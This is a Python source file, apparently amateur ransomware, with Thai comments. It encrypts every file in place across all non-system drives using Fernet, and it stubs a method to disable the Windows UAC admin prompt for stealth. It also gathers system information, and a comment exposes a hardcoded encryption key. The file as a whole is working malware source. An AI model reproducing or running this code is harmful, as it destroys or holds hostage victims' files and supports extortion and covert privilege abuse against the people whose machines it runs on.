# encrypt แยก folder พอ decrypt ใช้ นามสกุล .weep เป็นตัวเเยกเอา
#2-e6e4M_8viCfQVLTqrHPA0cbd0xAdHse4XgJp6mofM=            Key ที่เผลอพลาดไป encrypt file ตัวเอง ห้าม push ขึ้นไป
import os,subprocess,time
from cryptography.fernet import Fernet

class encrypt():

    def __init__(self,keyfile = None):
        if keyfile is not None:
            self.keyfile ="love sick girl"
            with open('keyfile.txt','rb') as f:
                self.key = f.read()
            self.cryptor = Fernet(self.key)
        else:
            self.keyfile = None
            self.key = Fernet.generate_key()
            self.cryptor = Fernet(self.key)
            self.create_key()


    def create_key(self):
        with open('keyfile.txt','wb+')as f:
            f.write(self.key)

    @staticmethod        
    def generatedirlist():
        """
        generate a to z and call findext every loop from a to z
        using drives parameter
        """
        for i in range(65,65+26):
            yield chr(i)+":\\"

    def encrypt(self,data):
        return self.cryptor.encrypt(data)

    def decrypt(self,data):
        return self.cryptor.decrypt(data)

    def ExcludeMainDrive(self):#to be tested against encryption function
        """
        this should encrypt all drive except drive c
        """
        exclude = self.FindMainDrive()
        path = [i for i in encrypt.generatedirlist() if i.lower() != exclude.lower()+':\\']
        print(path)
        for i in path:
            for root,_,files in os.walk(i):
                for name in files:
                    if name!='keyfile.txt':
                        walkingdir = os.path.join(root,name)
                        #################################################   use try block here with with block
                        with open(walkingdir,'rb+') as f:
                            data = f.read()
                            f.seek(0)
                            f.truncate()
                            if self.keyfile is not None:
                                f.write(self.decrypt(data))
                            else:
                                f.write(self.encrypt(data))
                        ###############################################
                        # os.rename(walkingdir,walkingdir+'.weep')

    def EncryptMainDrive(self):
        """
        This should encrypt maindrive except for Windows directory
        """
        OnlyDrive = self.FindMainDrive()
        exclude =set(['Windows']) 
        for root,dirs,files in os.walk(OnlyDrive):
            dirs[:] = [d for d in dirs if d not in exclude]
            with open('testExcludedir.txt','w',encoding='utf-8')as f:
                for name in files:
                    f.write(os.path.join(root,name))
                

                            
    def FindMainDrive(self):# Stable!
        """
        return a letter that is a system drive.
        """
        cmd ="echo %SystemRoot%"
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True) # return CompletedProcess Class
        if p.stderr!="":
            print(p.stderr)
            print('program terminated in 5 sec')
            time.sleep(5)
            exit()
        return p.stdout.split(':')[0]

    @staticmethod
    def gathersysinfo():#stable
        """
        just run the command sysinfo
        and return result
        """
        cmd ="systeminfo"
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True)
        if p.stderr!="":
            print(p.stderr)
            print('program terminated in 5 sec')
            time.sleep(5)
            exit()
        return p.stdout.split('\n') #need 1-31 lines

    @staticmethod
    def writesysinfo():#stable
        """
        write only not sensitive information
        from gather sysinfo method
        """
        with open('sysinfo.txt','w',encoding='utf-8') as f:
            a= encrypt.gathersysinfo()
            for i in a:
                i = str(i).strip()
            a[15] = a[15]+'  '+a[16].strip()
            a.remove(a[16])
            for i in a[1:31]:
                try:
                    f.write(str(a.index(i))+' '+i+'\n')
                    print(str(a.index(i))+' '+i)
                except Exception as exception:
                    print(exception.args[:16])
                    continue
    
    @staticmethod
    def disableUACAdminprompt():#developing
        """
        disable admin prompt for run stealthly
        by modifying HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
        ***this is a post exploitation job //use after gain admin shell** 
        """

encrypted = encrypt(keyfile='keyfile.txt')
encrypted.ExcludeMainDrive()
